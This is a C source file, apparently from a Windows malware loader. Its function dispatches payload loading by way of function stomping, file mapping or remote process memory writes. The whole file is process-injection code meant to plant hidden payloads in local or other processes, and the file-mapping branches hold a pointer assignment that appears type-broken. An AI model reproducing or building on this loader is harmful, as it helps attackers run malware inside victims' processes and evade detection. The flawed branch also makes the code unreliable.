#include "loaders.h"


BOOL payload_loading(PVOID *pPayloadAddress, LPVOID Payload, SIZE_T PayloadSize, ...) {
    BOOL bSuccess = FALSE;

    va_list args;
    va_start(args, PayloadSize);

    HANDLE hProcess = va_arg(args, HANDLE);
    LPWSTR processName = va_arg(args, LPWSTR);

#if defined(FUNCTION_STOMPING)
    if (IsHandleValid(hProcess)) {
        DebugPrint("[i] Payload loading through Remote Function Stomping...\n");
        bSuccess = WritePayloadViaRemoteFunctionStomping(pPayloadAddress, Payload, PayloadSize);
    } else {
        DebugPrint("[i] Payload loading through Function Stomping...\n");
        bSuccess = WritePayloadViaLocalFunctionStomping(pPayloadAddress, Payload, PayloadSize);
    }
#elif defined (FILE_MAPPING)
    if (IsHandleValid(hProcess)) {
        DebugPrint("[i] Payload loading through Remote File Mapping...\n");
        bSuccess = WritePayloadViaRemoteFileMapping(Payload, PayloadSize, pPayloadAddress, hProcess);
        pPayloadAddress = *pPayloadAddress;
    } else {
        DebugPrint("[i] Payload loading through Local File Mapping...\n");
        bSuccess = WritePayloadViaLocalFileMapping(Payload, PayloadSize, pPayloadAddress);
        pPayloadAddress = *pPayloadAddress;
    }    
#else
    if (IsHandleValid(hProcess)) {
        DebugPrint("[i] Payload loading through standard remote process in memory technique...\n");
        bSuccess = WritePayloadInRemoteProcessMemory(hProcess, Payload, PayloadSize, pPayloadAddress);
    } else {
        DebugPrint("[i] Payload loading through standard in memory technique...\n");
        bSuccess = WritePayloadInMemory(pPayloadAddress, Payload, PayloadSize);
    }
#endif
    return bSuccess;
}
